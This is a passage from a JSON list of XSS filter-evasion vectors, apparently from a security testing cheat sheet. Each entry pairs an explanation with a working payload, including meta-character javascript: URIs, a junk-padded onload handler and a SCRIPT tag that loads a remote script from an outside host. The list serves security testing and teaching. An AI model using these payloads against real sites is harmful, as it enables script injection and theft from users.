 },
   {
      "description" : "Spaces and meta chars before the JavaScript in images for XSS (this is useful if the pattern match doesn't take into account spaces in the word \"javascript:\" - which is correct since that won't render- and makes the false assumption that you can't have a space between the quote and the \"javascript:\" keyword. The actual reality is you can have any char from 1-32 in decimal).",
      "name" : "Spaces/Meta Chars",
      "vector" : "<IMG SRC=\" &#14;  javascript:alert('XSS');\">"
   },
   {
      "description" : "Non-alpha-non-digit XSS.  While I was reading the Firefox HTML parser I found that it assumes a non-alpha-non-digit is not valid after an HTML keyword and therefore considers it to be a whitespace or non-valid token after an HTML tag.  The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace.  For example \"<SCRIPT\\s\" != \"<SCRIPT/XSS\\s\"",
      "name" : "Non-Alpha/Non-Digit",
      "vector" : "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>"
   },
   {
      "description" : "Non-alpha-non-digit XSS part 2.  yawnmoth brought my attention to this vector, based on the same idea as above, however, I expanded on it, using my fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc...) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this does not apply to the grave accent char as seen here.",
      "name" : "Non-Alpha/Non-Digit Part 2",
      "vector" : "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>"
   },
   {
      "description" : "In Firefox and Netscape 8.1 in the Gecko rendering engine mode you don't actually need the \"></SCRIPT>\" portion of this Cross Site Scripting vector. Firefox assumes it's safe to close the HTML tag and add closing tags for you. How thoughtful! Unlike the next one, which doesn't affect Firefox, this does not require any additional HTML below it. You can add quotes if you need to, but they're not needed generally.",
   }